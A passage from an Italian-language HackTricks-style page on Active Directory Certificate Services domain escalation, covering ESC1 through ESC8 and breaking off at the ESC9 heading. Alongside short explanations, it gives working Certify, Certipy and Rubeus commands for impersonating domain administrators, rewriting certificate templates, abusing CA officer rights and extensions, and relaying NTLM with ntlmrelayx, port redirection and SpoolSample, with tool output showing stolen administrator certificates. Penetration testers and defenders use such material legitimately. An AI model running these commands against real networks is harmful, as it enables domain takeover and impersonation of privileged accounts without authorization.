# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Questo è un riepilogo delle sezioni sulle tecniche di escalation dei post:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelli di certificato configurati in modo errato - ESC1

### Spiegazione

### Spiegazione di Misconfigured Certificate Templates - ESC1

- **L'Enterprise CA concede i diritti di enrolment a utenti con privilegi ridotti.**
- **Non è richiesta l'approvazione di un manager.**
- **Non sono necessarie firme del personale autorizzato.**
- **I security descriptor sui modelli di certificato sono eccessivamente permissivi, consentendo agli utenti con privilegi ridotti di ottenere diritti di enrolment.**
- **I modelli di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
- Sono inclusi identificatori Extended Key Usage (EKU) come Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oppure nessun EKU (SubCA).
- **Il modello consente ai richiedenti di includere un subjectAltName nella Certificate Signing Request (CSR):**
- Active Directory (AD) assegna priorità al subjectAltName (SAN) presente in un certificato per la verifica dell'identità. Ciò significa che, specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (ad esempio, un domain administrator). La possibilità per il richiedente di specificare un SAN è indicata nell'oggetto AD del modello di certificato tramite la proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` consente al richiedente di specificare il SAN.

> [!CAUTION]
> La configurazione descritta consente agli utenti con privilegi ridotti di richiedere certificati con qualsiasi SAN desiderato, permettendo l'autenticazione come qualsiasi principal del dominio tramite Kerberos o SChannel.

Questa funzionalità è talvolta abilitata per supportare la generazione on-the-fly di certificati HTTPS o host da parte di prodotti o servizi di deployment, oppure a causa di una scarsa comprensione.

È stato osservato che la creazione di un certificato con questa opzione genera un avviso, cosa che non avviene quando un modello di certificato esistente, come il modello `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato, viene duplicato e successivamente modificato per includere un OID di autenticazione.<sup>[[6]](#references)</sup>

### Sfruttamento

Per **trovare i modelli di certificato vulnerabili** è possibile eseguire:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Per **abusare di questa vulnerabilità per impersonare un amministratore** si potrebbe eseguire:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Quindi puoi convertire il **certificato generato nel formato `.pfx`** e usarlo per **autenticarti nuovamente usando Rubeus o certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
I binari Windows "Certreq.exe" e "Certutil.exe" possono essere utilizzati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei template dei certificati all'interno dello schema di configurazione della foresta AD, nello specifico quelli che non richiedono approvazione o firme, che possiedono un EKU Client Authentication o Smart Card Logon e con il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato, può essere eseguita eseguendo la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelli di certificato configurati erroneamente - ESC2

### Spiegazione

Il secondo scenario di abuso è una variazione del primo:

1. I diritti di enrollment vengono concessi a utenti con privilegi ridotti dalla Enterprise CA.
2. Il requisito dell'approvazione del manager è disabilitato.
3. Il requisito delle firme autorizzate è omesso.
4. Un descrittore di sicurezza eccessivamente permissivo sul modello di certificato concede agli utenti con privilegi ridotti i diritti di enrollment dei certificati.
5. **Il modello di certificato è definito per includere l'EKU Any Purpose oppure nessun EKU.**

L'**EKU Any Purpose** consente a un attacker di ottenere un certificato per **qualsiasi scopo**, inclusa l'autenticazione client, l'autenticazione server, la firma del codice e così via. La stessa **technique usata per ESC3** può essere impiegata per sfruttare questo scenario.

I certificati **senza EKU**, che agiscono come certificati di una CA subordinata, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere usati per firmare nuovi certificati**. Di conseguenza, un attacker potrebbe specificare EKU o campi arbitrari nei nuovi certificati utilizzando un certificato di una CA subordinata.

Tuttavia, i nuovi certificati creati per l'**autenticazione al dominio** non funzioneranno se la CA subordinata non è considerata trusted dall'oggetto **`NTAuthCertificates`**, che è l'impostazione predefinita. Ciononostante, un attacker può ancora creare **nuovi certificati con qualsiasi EKU** e valori arbitrari. Questi potrebbero essere potenzialmente **abusati** per un'ampia gamma di scopi (ad esempio, firma del codice, autenticazione server e così via) e potrebbero avere implicazioni significative per altre applicazioni nella rete, come SAML, AD FS o IPSec.<sup>[[6]](#references)</sup>

Per enumerare i modelli che corrispondono a questo scenario nello schema di configurazione della foresta AD, è possibile eseguire la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Template dell'Enrollment Agent mal configurati - ESC3

### Spiegazione

Questo scenario è simile al primo e al secondo, ma **abusa** di un **EKU** diverso (Certificate Request Agent) e di **2 template** diversi (pertanto presenta 2 serie di requisiti),

L'**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), noto come **Enrollment Agent** nella documentazione Microsoft, consente a un principal di **effettuare l'enrollment** per un **certificate** **per conto di un altro utente**.

L'**“enrollment agent”** effettua l'enrollment in un tale **template** e usa il **certificate risultante per co-firmare una CSR per conto dell'altro utente**. In seguito **invia** la **CSR co-firmata** alla CA, effettuando l'enrollment in un **template** che **consente l'“enroll on behalf of”**, e la CA risponde con un **certificate appartenente all'“altro” utente**.<sup>[[6]](#references)</sup>

**Requisiti 1:**

- L'Enterprise CA concede diritti di enrollment agli utenti con privilegi ridotti.
- Il requisito dell'approvazione del manager è omesso.
- Non è richiesto alcun authorized signature.
- Il security descriptor del certificate template è eccessivamente permissivo e concede diritti di enrollment agli utenti con privilegi ridotti.
- Il certificate template include l'EKU Certificate Request Agent, consentendo di richiedere altri certificate template per conto di altri principal.

**Requisiti 2:**

- L'Enterprise CA concede diritti di enrollment agli utenti con privilegi ridotti.
- L'approvazione del manager viene aggirata.
- La versione dello schema del template è 1 oppure è superiore a 2 e specifica un Application Policy Issuance Requirement che richiede l'EKU Certificate Request Agent.
- Un EKU definito nel certificate template consente l'autenticazione al dominio.
- Sulla CA non vengono applicate restrizioni per gli enrollment agent.

### Abuso

Puoi usare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per abusare di questo scenario:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Gli **users** autorizzati a **obtain** un **enrollment agent certificate**, i template in cui gli **agents** possono effettuare l'enrollment e gli **accounts** per conto dei quali l'enrollment agent può agire possono essere limitati dalle enterprise CA. Questo risultato si ottiene aprendo lo **snap-in** `certsrc.msc`, facendo **right-click sulla CA**, facendo **click su Properties** e quindi **navigando** fino alla scheda “Enrollment Agents”.

Tuttavia, viene indicato che l'impostazione **default** per le CA è “**Do not restrict enrollment agents**”. Quando la restrizione sugli enrollment agents viene abilitata dagli amministratori, impostandola su “Restrict enrollment agents”, la configurazione predefinita rimane estremamente permissiva. Consente a **Everyone** di effettuare l'enrollment in tutti i template impersonando chiunque.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

Il **security descriptor** sui **certificate templates** definisce le **permissions** specifiche possedute dagli **AD principals** relativamente al template.

Se un **attacker** possiede le **permissions** necessarie per **alterare** un **template** e **institute** una qualsiasi delle **exploitable misconfigurations** descritte nelle **sezioni precedenti**, è possibile facilitare una privilege escalation.

Tra le permission rilevanti applicabili ai certificate templates figurano:<sup>[[6]](#references)</sup>

- **Owner:** Concede il controllo implicito sull'oggetto, consentendo la modifica di qualsiasi attributo.
- **FullControl:** Consente il controllo completo dell'oggetto, inclusa la possibilità di modificare qualsiasi attributo.
- **WriteOwner:** Permette di modificare il proprietario dell'oggetto assegnandolo a un principal sotto il controllo dell'attacker.
- **WriteDacl:** Consente di modificare gli access control, potenzialmente concedendo a un attacker FullControl.
- **WriteProperty:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

### Abuse

Per identificare i principals con diritti di modifica sui template e su altri oggetti PKI, eseguire l'enumeration con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un esempio di privesc come quello precedente:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 si verifica quando un utente dispone di privilegi di scrittura su un certificate template. Questo può, ad esempio, essere sfruttato per sovrascrivere la configurazione del certificate template e rendere il template vulnerabile a ESC1.

Come possiamo vedere nel percorso sopra, solo `JOHNPC` dispone di questi privilegi, ma il nostro utente `JOHN` ha il nuovo edge `AddKeyCredentialLink` verso `JOHNPC`. Poiché questa tecnica è correlata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ecco una breve anteprima del comando `shadow auto` di Certipy per recuperare l'hash NT della vittima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** può sovrascrivere la configurazione di un modello di certificato con un singolo comando. Per **impostazione predefinita**, Certipy **sovrascriverà** la configurazione per renderla **vulnerabile a ESC1**. Possiamo anche specificare il **`-save-old` parameter per salvare la vecchia configurazione**, utile per **ripristinare** la configurazione dopo il nostro attacco.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controllo degli accessi agli oggetti PKI vulnerabili - ESC5

### Spiegazione

L'ampia rete di relazioni basate su ACL interconnesse, che include diversi oggetti oltre ai certificate templates e alla certificate authority, può influire sulla sicurezza dell'intero sistema AD CS. Questi oggetti, che possono avere un impatto significativo sulla sicurezza, comprendono:

- L'oggetto computer AD del server CA, che può essere compromesso tramite meccanismi come S4U2Self o S4U2Proxy.
- Il server RPC/DCOM del server CA.
- Qualsiasi oggetto AD discendente o container all'interno del percorso del container specifico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Questo percorso include, a titolo esemplificativo ma non esaustivo, container e oggetti come il Certificate Templates container, il Certification Authorities container, l'oggetto NTAuthCertificates e l'Enrollment Services Container.

La sicurezza del sistema PKI può essere compromessa se un attacker con privilegi ridotti riesce ad assumere il controllo di uno qualsiasi di questi componenti critici.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

L'argomento discusso nel [**post di CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) tratta anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come descritto da Microsoft. Questa configurazione, quando attivata su una Certification Authority (CA), consente di includere **valori definiti dall'utente** nel **subject alternative name** per **qualsiasi richiesta**, comprese quelle create da Active Directory®. Di conseguenza, questa impostazione consente a un **intruder** di effettuare l'enrollment tramite **qualsiasi template** configurato per l'**authentication** del dominio, in particolare quelli che consentono l'enrollment agli utenti **unprivileged**, come il template User standard. Di conseguenza, è possibile ottenere un certificato che consenta all'intruder di autenticarsi come domain administrator o come **qualsiasi altra entità attiva** all'interno del dominio.<sup>[[9]](#references)</sup>

**Nota**: L'approccio per aggiungere **alternative names** a una Certificate Signing Request (CSR), tramite l'argomento `-attrib "SAN:"` in `certreq.exe` (indicato come “Name Value Pairs”), presenta una **differenza** rispetto alla strategia di exploitation dei SAN in ESC1. In questo caso, la distinzione riguarda **il modo in cui le informazioni dell'account vengono incapsulate**: all'interno di un attributo del certificato anziché di un'estensione.

### Abuse

Per verificare se l'impostazione è attivata, le organizzazioni possono utilizzare il seguente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Questa operazione utilizza essenzialmente l'**accesso al registro remoto**; pertanto, un approccio alternativo potrebbe essere:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa configurazione errata e sfruttarla:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Per modificare queste impostazioni, supponendo di disporre dei diritti **amministrativi di dominio** o equivalenti, è possibile eseguire il seguente comando da qualsiasi workstation:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Dopo gli aggiornamenti di sicurezza di maggio 2022, i **certificates** appena emessi conterranno una **security extension** che incorpora la proprietà `objectSid` del **requester**. Per ESC1, questo SID viene derivato dal SAN specificato. Tuttavia, per **ESC6**, il SID rispecchia l'`objectSid` del **requester**, non il SAN.\
> Per sfruttare ESC6, è essenziale che il sistema sia vulnerabile a ESC10 (Weak Certificate Mappings), che assegna priorità al **SAN rispetto alla nuova security extension**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Il controllo degli accessi per una certificate authority viene gestito tramite un insieme di autorizzazioni che regolano le azioni della CA. Queste autorizzazioni possono essere visualizzate accedendo a `certsrv.msc`, facendo clic con il pulsante destro del mouse su una CA, selezionando le proprietà e passando quindi alla scheda Security. Inoltre, le autorizzazioni possono essere enumerate utilizzando il modulo PSPKI con comandi come:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Questo fornisce informazioni sui diritti principali, ovvero **`ManageCA`** e **`ManageCertificates`**, corrispondenti rispettivamente ai ruoli di “amministratore della CA” e “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Abuso

Avere diritti **`ManageCA`** su una certificate authority consente al principal di manipolare le impostazioni da remoto utilizzando PSPKI. Ciò include l'attivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire la specifica del SAN in qualsiasi template, un aspetto cruciale della domain escalation.

La semplificazione di questo processo è possibile utilizzando il cmdlet **Enable-PolicyModuleFlag** di PSPKI, che consente di apportare modifiche senza interagire direttamente con la GUI.

Il possesso dei diritti **`ManageCertificates`** facilita l'approvazione delle richieste in sospeso, aggirando di fatto la protezione “approvazione del certificate manager della CA”.

È possibile utilizzare una combinazione dei moduli **Certify** e **PSPKI** per richiedere, approvare e scaricare un certificato:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Spiegazione

> [!WARNING]
> Nel **precedente attack** sono stati utilizzati i permessi **`Manage CA`** per **abilitare** il flag **EDITF_ATTRIBUTESUBJECTALTNAME2** ed eseguire l'**attack ESC6**, ma questo non avrà alcun effetto finché il servizio CA (`CertSvc`) non verrà riavviato. Quando un utente dispone del diritto di accesso **`Manage CA`**, gli è consentito anche **riavviare il servizio**. Tuttavia, ciò **non significa che l'utente possa riavviare il servizio da remoto**. Inoltre, l'**ESC6 potrebbe non funzionare out of the box** nella maggior parte degli ambienti sottoposti a patch, a causa degli aggiornamenti di sicurezza di maggio 2022.

Pertanto, viene presentato un altro attack.

Prerequisiti:

- Solo il permesso **`ManageCA`**
- Permesso **`Manage Certificates`** (può essere concesso da **`ManageCA`**)
- Il certificate template **`SubCA`** deve essere **abilitato** (può essere abilitato da **`ManageCA`**)

La tecnica si basa sul fatto che gli utenti con i diritti di accesso `Manage CA` _e_ `Manage Certificates` possono **emettere certificate requests non riuscite**. Il certificate template **`SubCA`** è **vulnerabile a ESC1**, ma **solo gli amministratori** possono effettuare l'enrollment nel template. Pertanto, un **utente** può **richiedere** l'enrollment nel template **`SubCA`** - richiesta che verrà **negata** - ma che **verrà poi emessa dal manager**.<sup>[[6]](#references)</sup>

#### Abuse

È possibile **concedersi il diritto di accesso `Manage Certificates`** aggiungendo il proprio utente come nuovo officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Il template **`SubCA`** può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il template `SubCA` è abilitato.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul template `SubCA`**.

**Questa richiesta verrà negata**, ma salveremo la chiave privata e annoteremo l'ID della richiesta.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con i nostri **`Manage CA` e `Manage Certificates`**, possiamo quindi **emettere la richiesta di certificato non riuscita** con il comando `ca` e il parametro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuso dell'estensione Manage Certificates (SetExtension)

#### Spiegazione

Oltre ai classici abusi ESC7 (abilitazione degli attributi EDITF o approvazione delle richieste in sospeso), **Certify 2.0** ha rivelato una nuova primitiva che richiede soltanto il ruolo *Manage Certificates* (ovvero **Certificate Manager / Officer**) sulla Enterprise CA.<sup>[[3]](#references)</sup>

Il metodo RPC `ICertAdmin::SetExtension` può essere eseguito da qualsiasi principal che disponga di *Manage Certificates*. Sebbene il metodo fosse tradizionalmente utilizzato dalle CA legittime per aggiornare le estensioni sulle richieste **in sospeso**, un attacker può abusarne per **aggiungere un'estensione del certificato *non predefinita*** (ad esempio un OID personalizzato di *Certificate Issuance Policy* come `1.1.1.1`) a una richiesta in attesa di approvazione.

Poiché il template target **non definisce un valore predefinito per tale estensione**, la CA NON sovrascriverà il valore controllato dall'attacker quando la richiesta verrà infine emessa. Il certificato risultante conterrà quindi un'estensione scelta dall'attacker, che potrebbe:

* Soddisfare i requisiti di Application / Issuance Policy di altri template vulnerabili (portando a privilege escalation).
* Iniettare EKU o policy aggiuntive che conferiscono al certificato una trust imprevista nei sistemi di terze parti.

In breve, *Manage Certificates* – precedentemente considerato la metà “meno potente” di ESC7 – può ora essere sfruttato per una privilege escalation completa o per una persistence a lungo termine, senza modificare la configurazione della CA o richiedere il diritto più restrittivo *Manage CA*.

#### Abuso della primitive con Certify 2.0

1. **Invia una certificate request che rimarrà *pending*.** Questo può essere forzato con un template che richiede l'approvazione di un manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Aggiungi un'estensione personalizzata alla richiesta pending** usando il nuovo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Se il template non definisce già l'estensione *Certificate Issuance Policies*, il valore sopra indicato verrà preservato dopo l'emissione.*

3. **Emetti la richiesta** (se il tuo ruolo dispone anche dei diritti di approvazione *Manage Certificates*) oppure attendi che un operatore la approvi. Una volta emesso il certificato, scaricalo:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Il certificato risultante ora contiene il malicious issuance-policy OID e può essere utilizzato negli attacchi successivi (ad esempio ESC13, domain escalation, ecc.).

> NOTA: Lo stesso attacco può essere eseguito con Certipy ≥ 4.7 tramite il comando `ca` e il parametro `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Spiegazione

> [!TIP]
> Negli ambienti in cui **AD CS è installato**, se esiste un **web enrollment endpoint vulnerabile** e almeno un **certificate template è pubblicato** e consente il domain computer enrollment e la client authentication (come il template predefinito **`Machine`**), diventa possibile per un attacker **compromettere qualsiasi computer con il servizio spooler attivo**!

AD CS supporta diversi **metodi di enrollment basati su HTTP**, resi disponibili tramite ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per il certificate enrollment basato su HTTP sono vulnerabili agli **attacchi NTLM relay**. Un attacker, da una **macchina compromessa, può impersonare qualsiasi account AD che esegua l'autenticazione tramite NTLM inbound**. Impersonando l'account vittima, l'attacker può accedere a queste web interface per **richiedere un client authentication certificate utilizzando i certificate template `User` o `Machine`**.

- La **web enrollment interface** (una vecchia applicazione ASP disponibile all'indirizzo `http://<caserver>/certsrv/`) utilizza HTTP בלבד per impostazione predefinita, senza offrire protezione contro gli attacchi NTLM relay. Inoltre, consente esplicitamente solo l'autenticazione NTLM tramite il relativo header HTTP Authorization, rendendo inapplicabili metodi di autenticazione più sicuri come Kerberos.
- Il **Certificate Enrollment Service** (CES), il **Certificate Enrollment Policy** (CEP) Web Service e il **Network Device Enrollment Service** (NDES), per impostazione predefinita, supportano l'autenticazione negotiate tramite il relativo header HTTP Authorization. L'autenticazione Negotiate **supporta sia** Kerberos sia **NTLM**, consentendo a un attacker di eseguire un **downgrade all'autenticazione NTLM** durante gli attacchi relay. Sebbene questi web service abiliti HTTPS per impostazione predefinita, HTTPS da solo **non protegge dagli attacchi NTLM relay**. La protezione dagli attacchi NTLM relay per i servizi HTTPS è possibile solo quando HTTPS è combinato con il channel binding. Purtroppo, AD CS non abilita l'Extended Protection for Authentication su IIS, necessaria per il channel binding.<sup>[[6]](#references)</sup>

Un **problema** comune degli attacchi NTLM relay è la **breve durata delle sessioni NTLM** e l'impossibilità per l'attacker di interagire con servizi che **richiedono NTLM signing**.

Tuttavia, questa limitazione viene superata sfruttando un attacco NTLM relay per ottenere un certificato per l'utente, poiché il periodo di validità del certificato determina la durata della sessione e il certificato può essere utilizzato con servizi che **richiedono NTLM signing**. Per le istruzioni sull'utilizzo di un certificato rubato, consulta:


{{#ref}}
account-persistence.md
{{#endref}}

Un'altra limitazione degli attacchi NTLM relay è che **una macchina controllata dall'attacker deve essere autenticata da un account vittima**. L'attacker potrebbe attendere oppure tentare di **forzare** questa autenticazione:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera gli **HTTP AD CS endpoint abilitati**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` viene utilizzata dalle Autorità di certificazione (CA) aziendali per archiviare gli endpoint del Certificate Enrollment Service (CES). Questi endpoint possono essere analizzati ed elencati utilizzando lo strumento **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La richiesta di un certificato viene effettuata da Certipy, per impostazione predefinita, in base al template `Machine` o `User`, determinato in base al fatto che il nome dell'account sottoposto a relay termini con `$`. È possibile specificare un template alternativo utilizzando il parametro `-template`.

È quindi possibile utilizzare una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) per forzare l'autenticazione. Quando si ha a che fare con i domain controller, è necessario specificare `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Spiegazione

